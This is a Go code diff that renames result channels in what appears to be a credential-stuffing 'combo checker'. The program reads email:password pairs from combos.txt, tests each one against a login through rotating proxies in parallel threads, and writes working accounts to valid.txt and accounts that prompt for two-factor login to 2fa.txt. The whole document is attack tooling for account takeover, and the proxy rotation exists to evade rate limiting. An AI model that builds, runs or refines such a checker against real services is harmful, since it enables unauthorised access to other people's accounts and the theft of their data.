@@ -34,25 +34,26 @@ func main() {
 	go readFile("./input/combos.txt", comboChannel, &wg)
 
 	// Create channels for results
-	validChan := make(chan string, 10)
-	tfaChan := make(chan string, 10)
-	invalidChan := make(chan string, 10)
+	validChannel := make(chan string, 10)
+	mfaChannel := make(chan string, 10)
+	invalidChannel := make(chan string, 10)
 
 	wg.Add(1)
+
 	// Check credentials using threads and proxies
-	go checkCredentialsWithProxies(comboChannel, proxies, validChan, tfaChan, invalidChan, &wg, config.Threads)
+	go checkCredentialsWithProxies(comboChannel, proxies, validChannel, mfaChannel, invalidChannel, &wg, config.Threads)
 
 	wg.Add(3)
 	// Save results to files
-	go saveFile("./output/valid.txt", validChan, &wg)
-	go saveFile("./output/2fa.txt", tfaChan, &wg)
-	go saveFile("./output/invalid.txt", invalidChan, &wg)
+	go saveFile("./output/valid.txt", validChannel, &wg)
+	go saveFile("./output/2fa.txt", mfaChannel, &wg)
+	go saveFile("./output/invalid.txt", invalidChannel, &wg)
 
 	wg.Wait()
 }
 
 // checkCredentialsWithProxies checks the credentials using the given proxies
-func checkCredentialsWithProxies(comboChan chan string, proxies []string, validChan, tfaChan, invalidChan chan string, wg *sync.WaitGroup, threads int) {
+func checkCredentialsWithProxies(comboChannel chan string, proxies []string, validChannel, mfaChannel, invalidChannel chan string, wg *sync.WaitGroup, threads int) {
 	defer wg.Done()
 
 	var wg1 sync.WaitGroup
@@ -60,18 +61,18 @@ func checkCredentialsWithProxies(comboChan chan string, proxies []string, validC
 	for i := 0; i < threads; i++ {
 		go func() {
 			defer wg1.Done()
-			checkCredentials(comboChan, proxies, validChan, tfaChan, invalidChan)
+			checkCredentials(comboChannel, proxies, validChannel, mfaChannel, invalidChannel)
 		}()
 	}
 	wg1.Wait()
-	close(validChan)
-	close(invalidChan)
-	close(tfaChan)
+	close(validChannel)
+	close(invalidChannel)
+	close(mfaChannel)
 }
 
 // checkCredentials checks the credentials using the given proxies
-func checkCredentials(comboChan chan string, proxies []string, validChan, tfaChan, invalidChan chan string) {
-	for combo := range comboChan {
+func checkCredentials(comboChannel chan string, proxies []string, validChannel, tfaChannel, invalidChannel chan string) {
+	for combo := range comboChannel {
 		parts := strings.Split(combo, ":")
 		email, password := parts[0], parts[1]
 
@@ -79,19 +80,19 @@ func checkCredentials(comboChan chan string, proxies []string, validChan, tfaCha
 			result := combo + " - " + proxy
 			resp, err := checkWithProxy(email, password, proxy)
 			if err != nil {
-				invalidChan <- combo + " - " + proxy
+				invalidChannel <- combo + " - " + proxy
 				log.Println(result + "- invalid")
 				continue
 			}
 
 			if resp.StatusCode == 200 {
-				validChan <- combo + " - " + proxy
+				validChannel <- combo + " - " + proxy
 				log.Println(result + "- valid")
 			} else if resp.StatusCode == 302 {
-				tfaChan <- combo + " - " + proxy
+				tfaChannel <- combo + " - " + proxy
 				log.Println(result + "- 2fa")
 			} else {
-				invalidChan <- combo + " - " + proxy
+				invalidChannel <- combo + " - " + proxy
 				log.Println(result + "- invalid")
 			}
 
